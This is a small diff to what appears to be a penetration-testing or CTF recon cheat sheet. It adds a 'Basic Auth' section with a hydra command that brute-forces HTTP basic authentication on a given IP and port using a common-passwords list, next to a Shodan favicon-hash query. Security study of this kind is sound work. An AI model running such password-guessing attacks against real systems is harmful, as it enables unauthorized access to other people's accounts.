@@ -2,8 +2,11 @@
 
 ## Recon 
 
-##### shodan
+## shodan
 `http.favicon.hash:123456789`
+
+## Basic Auth
+`hydra -l basic-auth-user -P 2023-200_most_used_passwords.txt 94.237.51.23 http-get / -s 42849`
 
 ## HTTPX 
 
